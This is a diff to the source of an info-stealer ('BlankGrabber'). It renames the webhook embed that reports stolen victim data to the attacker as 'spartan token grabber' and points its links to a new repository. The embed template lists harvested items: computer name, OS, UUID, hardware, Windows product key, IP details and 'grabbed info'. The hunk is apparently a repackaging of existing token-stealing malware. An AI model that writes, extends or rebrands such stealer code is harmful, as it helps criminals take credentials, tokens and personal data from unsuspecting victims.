@@ -1363,17 +1363,17 @@ class BlankGrabber:
     {
       "title": "Blank Grabber",
       "description": f"**__System Info__\n```autohotkey\nComputer Name: {computerName}\nComputer OS: {computerOS}\nTotal Memory: {totalMemory}\nUUID: {uuid}\nCPU: {cpu}\nGPU: {gpu}\nProduct Key: {productKey}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**",
-      "url": "https://github.com/Blank-c/Blank-Grabber",
+      "url": "https://github.com/uwewygeywyewe/spartan-token-grabbber-v2",
       "color": 34303,
       "footer": {
-        "text": "Grabbed by Blank Grabber | https://github.com/Blank-c/Blank-Grabber"
+        "text": "Grabbed by spartan token grabber | https://github.com/uwewygeywyewe/spartan-token-grabbber-v2"
       },
       "thumbnail": {
         "url": image_url
       }
     }
   ],
-  "username" : "Blank Grabber",
+  "username" : "spartan token grabber",
   "avatar_url" : image_url
 }
 
